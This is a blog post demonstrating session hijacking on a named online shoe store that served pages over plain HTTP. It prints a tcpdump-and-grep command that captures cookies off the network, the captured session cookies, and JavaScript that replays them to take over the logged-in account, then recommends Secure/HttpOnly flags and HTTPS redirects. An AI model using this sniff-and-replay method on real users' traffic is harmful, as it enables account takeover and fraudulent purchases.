---
title: Stealing Session Cookies with Tcpdump
layout: post
date: 2016-06-23T21:55:24Z
tags: [netsec, javascript, web]
uuid: 309396d4-fe6e-30a1-1a96-35281b58fb77
---

My wife was shopping online for running shoes when she got this
classic Firefox pop-up.

[![](/img/tcpdump/warning-thumb.png)](/img/tcpdump/warning.png)

These days this is usually just a server misconfiguration annoyance.
However, she was logged into an account, which included a virtual
shopping cart and associated credit card payment options, meaning
actual sensitive information would be at risk.

The main culprit was the website's search feature, which wasn't
transmitted over HTTPS. There's an HTTPS version of the search (which
I found manually), but searches aren't directed there. This means it's
also vulnerable to [SSL stripping][sslstrip].

Fortunately Firefox warns about the issue and requires a positive
response before continuing. Neither Chrome nor Internet Explorer get
this right. Both transmit session cookies in the clear without
warning, then subtly mention it after the fact. She may not have even
noticed the problem (and then asked me about it) if not for that
pop-up.

I contacted the website's technical support two weeks ago and they
never responded, nor did they fix any of their issues, so for now you
can [see this all for yourself][rr].

### Finding the session cookies

To prove to myself that this whole situation was really as bad as it
looked, I decided to steal her session cookie and use it to manipulate
her shopping cart. First I hit F12 in her browser to peek at the
network headers. Perhaps nothing important was actually sent in the
clear.

![](/img/tcpdump/headers.png)

The session cookie (red box) was definitely sent in the request. I
only need to catch it on the network. That's an easy job for tcpdump.

    tcpdump -A -l dst www.roadrunnersports.com and dst port 80 | \
        grep "^Cookie: "

This command tells tcpdump to dump selected packet content as ASCII
(`-A`). It also sets output to line-buffered so that I can see packets
as soon as they arrive (`-l`). The filter will only match packets
going out to this website and only on port 80 (HTTP), so I won't see
any extraneous noise (`dst <addr> and dst port <port>`). Finally, I
crudely run that all through grep to see if any cookies fall out.

On the next insecure page load I get this (wrapped here for display)
spilling many times into my terminal:

    Cookie: JSESSIONID=99004F61A4ED162641DC36046AC81EAB.prd_rrs12; visitSo
      urce=Registered; RoadRunnerTestCookie=true; mobify-path=; __cy_d=09A
      78CC1-AF18-40BC-8752-B2372492EDE5; _cybskt=; _cycurrln=; wpCart=0; _
      up=1.2.387590744.1465699388; __distillery=a859d68_771ff435-d359-489a
      -bf1a-1e3dba9b8c10-db57323d1-79769fcf5b1b-fc6c; DYN_USER_ID=16328657
      52; DYN_USER_CONFIRM=575360a28413d508246fae6befe0e1f4

That's a bingo! I massage this into a bit of JavaScript, go to the
store page in my own browser, and dump it in the developer console. I
don't know which cookies are important, but that doesn't matter. I
take them all.

    document.cookie = "Cookie: JSESSIONID=99004F61A4ED162641DC36046A" +
                      "C81EAB.prd_rrs12;";
    document.cookie = "visitSource=Registered";
    document.cookie = "RoadRunnerTestCookie=true";
    document.cookie = "mobify-path=";
    document.cookie = "__cy_d=09A78CC1-AF18-40BC-8752-B2372492EDE5";
    document.cookie = "_cybskt=";
    document.cookie = "_cycurrln=";
    document.cookie = "wpCart=0";
    document.cookie = "_up=1.2.387590744.1465699388";
    document.cookie = "__distillery=a859d68_771ff435-d359-489a-bf1a-" +
                      "1e3dba9b8c10-db57323d1-79769fcf5b1b-fc6c";
    document.cookie = "DYN_USER_ID=1632865752";
    document.cookie = "DYN_USER_CONFIRM=575360a28413d508246fae6befe0e1f4";

Refresh the page and now I'm logged in. I can see what's in the
shopping cart. I can add and remove items. I can checkout and complete
the order. My browser is as genuine as hers.

### How to fix it

The quick and dirty thing to do is set the [Secure][secure] and
[HttpOnly][httponly] flags on all cookies. The first prevents cookies
from being sent in the clear, where a passive observer might see them.
The second prevents the JavaScript from accessing them, since an
active attacker could inject their own JavaScript in the page.
Customers would appear to be logged out on plain HTTP pages, which is
confusing.

However, since this is an online store, there's absolutely no excuse
to be serving *anything* over plain HTTP. This just opens customers up
to downgrade attacks. The long term solution, in addition to the
cookie flags above, is to redirect all HTTP requests to HTTPS and
never serve or request content over HTTP, especially not executable
content like JavaScript.


[rr]: https://www.roadrunnersports.com
[sslstrip]: https://www.youtube.com/watch?v=MFol6IMbZ7Y
[secure]: http://tools.ietf.org/html/rfc6265#section-4.1.2.5
[httponly]: http://tools.ietf.org/html/rfc6265#section-4.1.2.6
